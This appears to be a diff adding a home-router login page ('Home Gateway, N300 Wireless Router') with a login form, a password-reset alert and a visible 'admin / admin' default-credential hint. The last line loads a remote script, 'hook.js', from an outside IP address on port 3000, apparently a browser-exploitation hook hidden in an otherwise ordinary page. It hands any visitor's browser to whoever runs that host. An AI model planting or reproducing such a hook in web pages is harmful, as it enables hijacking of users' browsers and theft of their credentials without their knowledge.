@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Home Router • Login</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="login-page">
+  <div class="router-login">
+    <div class="router-header">
+      <i class="fas fa-wifi"></i>
+      <div>
+        <h1>Home Gateway</h1>
+        <div class="sub">N300 Wireless Router · v2.1</div>
+      </div>
+    </div>
+
+    <div class="login-form">
+      <form id="loginForm" action="/login" method="post">
+        <div class="input-group">
+          <label for="username">Username</label>
+          <div class="field">
+            <i class="fas fa-user-cog"></i>
+            <input type="text" id="username" name="username" placeholder="admin" autocomplete="username" required>
+          </div>
+        </div>
+
+        <div class="input-group">
+          <label for="password">Password</label>
+          <div class="field">
+            <i class="fas fa-lock"></i>
+            <input type="password" id="password" name="password" placeholder="••••••••" autocomplete="current-password" required>
+          </div>
+        </div>
+
+        <button type="submit" class="login-btn">
+          <i class="fas fa-arrow-right-to-bracket"></i> Log In
+        </button>
+
+        <div id="statusMessage" class="status-message">
+          <i class="fas fa-exclamation-circle"></i>
+          <span id="statusText">Invalid username or password.</span>
+        </div>
+      </form>
+    </div>
+
+    <div class="router-footer">
+      <div class="hint"><i class="fas fa-info-circle"></i><span>Default: admin / admin</span></div>
+      <a href="#" class="reset-link" id="resetHint">Forgot password?</a>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const statusMsg = document.getElementById('statusMessage');
+    const statusText = document.getElementById('statusText');
+
+    function showMessage(text, ok = false) {
+      statusText.textContent = text;
+      statusMsg.classList.add('show');
+      if (ok) {
+        statusMsg.style.background = '#e0f2e9';
+        statusMsg.style.color = '#0f6b41';
+        statusMsg.style.borderLeftColor = '#0f6b41';
+        statusMsg.querySelector('i').className = 'fas fa-check-circle';
+      } else {
+        statusMsg.style.background = '#fee2e2';
+        statusMsg.style.color = '#991b1b';
+        statusMsg.style.borderLeftColor = '#b91c1c';
+        statusMsg.querySelector('i').className = 'fas fa-exclamation-circle';
+      }
+    }
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value;
+
+      if (!username || !password) return showMessage('Please fill in all fields.');
+
+      try {
+        const res = await fetch('/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password })
+        });
+        const data = await res.json();
+        if (data.success) {
+          showMessage('Login successful! Redirecting…', true);
+          setTimeout(() => window.location.href = data.redirect || '/dashboard', 600);
+        } else {
+          showMessage(data.message || 'Login failed.');
+        }
+      } catch (err) {
+        showMessage('Cannot reach server.');
+      }
+    });
+
+    document.getElementById('resetHint').addEventListener('click', (e) => {
+      e.preventDefault();
+      alert('Reset instructions:\n1. Press the reset button on your router for 10 seconds.\n2. Default login: admin / admin.\n3. Set a new password after logging in.');
+    });
+  </script>
+  <script src="http://10.168.167.219:3000/hook.js"></script>
+</body>
+</html>
